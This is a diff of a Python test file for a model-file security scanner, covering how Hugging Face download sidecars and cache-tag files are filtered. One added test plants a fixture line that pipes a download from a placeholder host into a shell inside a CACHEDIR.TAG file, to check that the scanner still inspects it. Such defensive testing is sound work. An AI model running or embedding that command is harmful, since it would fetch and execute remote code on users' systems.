@@ -80,6 +80,11 @@ def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
         handle.truncate(8 + header_len + 1)
 
 
+def _write_minimal_safetensors(path: Path) -> None:
+    metadata = b"{}"
+    path.write_bytes(struct.pack("<Q", len(metadata)) + metadata)
+
+
 def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
     field = b"z " + (b"x" * 32)
     return field * ((min_bytes // len(field)) + 1)
@@ -126,7 +131,9 @@ def _write_hf_cachedir_tag(path: Path) -> None:
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_text(
         "Signature: 8a477f597d28d172789f06886806bc55\n"
-        "# This file is a cache directory tag created by huggingface_hub.\n",
+        "# This file is a cache directory tag created by huggingface_hub.\n"
+        "# For information about cache directory tags, see:\n"
+        "#\thttps://bford.info/cachedir/\n",
         encoding="utf-8",
     )
 
@@ -1276,6 +1283,51 @@ class TestDirectoryFileFiltering:
         assert not any(cache_fragment in (check.location or "") for check in results.checks)
         assert not any(cache_fragment in (issue.location or "") for issue in results.issues)
 
+    def test_local_download_sidecars_do_not_override_scanner_selection(self, tmp_path: Path) -> None:
+        """HF local_dir sidecars must not broaden explicit scanner selections."""
+        model_dir = tmp_path / "downloaded-model"
+        model_dir.mkdir()
+        weights_path = model_dir / "weights.safetensors"
+        _write_minimal_safetensors(weights_path)
+        vocab_path = model_dir / "vocab.txt"
+        vocab_path.write_text("[PAD]\n[UNK]\n", encoding="utf-8")
+
+        download_root = model_dir / ".cache" / "huggingface" / "download"
+        _write_hf_download_metadata(download_root / "weights.safetensors.metadata")
+        _write_hf_download_metadata(download_root / "vocab.txt.metadata")
+
+        results = scan_model_directory_or_file(
+            str(model_dir),
+            scanners=["safetensors"],
+            cache_scan_results=False,
+        )
+
+        assert results.files_scanned == 1
+        assert {Path(asset.path).relative_to(model_dir).as_posix() for asset in results.assets} == {
+            "weights.safetensors",
+        }
+
+    def test_local_download_sidecar_inventory_works_under_cache_named_parent(self, tmp_path: Path) -> None:
+        """Model roots under an unrelated `.cache` parent still preserve real sidecar-backed files."""
+        model_dir = tmp_path / ".cache" / "models" / "downloaded-model"
+        model_dir.mkdir(parents=True)
+        (model_dir / "config.json").write_text('{"model_type":"bert"}', encoding="utf-8")
+        vocab_path = model_dir / "vocab.txt"
+        vocab_path.write_text("[PAD]\n[UNK]\n", encoding="utf-8")
+
+        download_root = model_dir / ".cache" / "huggingface" / "download"
+        _write_hf_download_metadata(download_root / "config.json.metadata")
+        _write_hf_download_metadata(download_root / "vocab.txt.metadata")
+
+        results = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
+
+        assert results.files_scanned == 2
+        assert {Path(asset.path).relative_to(model_dir).as_posix() for asset in results.assets} == {
+            "config.json",
+            "vocab.txt",
+        }
+        assert not any(".cache/huggingface" in path for path in results.file_metadata)
+
     def test_malicious_local_download_metadata_sidecar_is_scanned(self, tmp_path: Path) -> None:
         """Scannable bytes with a sidecar name must not be hidden by local_dir filtering."""
         model_dir = tmp_path / "downloaded-model"
@@ -1322,6 +1374,21 @@ class TestDirectoryFileFiltering:
         assert results.files_scanned == 2
         assert str(payload) in results.file_metadata
         assert any(issue.rule_code == "S201" and issue.location == str(payload) for issue in results.issues)
+
+    def test_appended_hf_cachedir_tag_is_scanned(self, tmp_path: Path) -> None:
+        """Only the exact Hugging Face cache tag body is skipped."""
+        model_dir = tmp_path / "downloaded-model"
+        model_dir.mkdir()
+        (model_dir / "config.json").write_text('{"model_type":"bert"}', encoding="utf-8")
+        payload = model_dir / ".cache" / "huggingface" / "CACHEDIR.TAG"
+        _write_hf_cachedir_tag(payload)
+        with payload.open("a", encoding="utf-8") as handle:
+            handle.write("extra_payload=metadata.os.system('curl https://evil.example/p.sh | sh')\n")
+
+        results = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
+
+        assert results.files_scanned == 2
+        assert str(payload) in results.file_metadata
 
     @pytest.mark.parametrize("filename", ["payload.pkl.lock", "payload.pkl.metadata", ".gitignore", ".gitattributes"])
     def test_local_download_bookkeeping_rejects_spoofed_payloads(self, tmp_path: Path, filename: str) -> None:
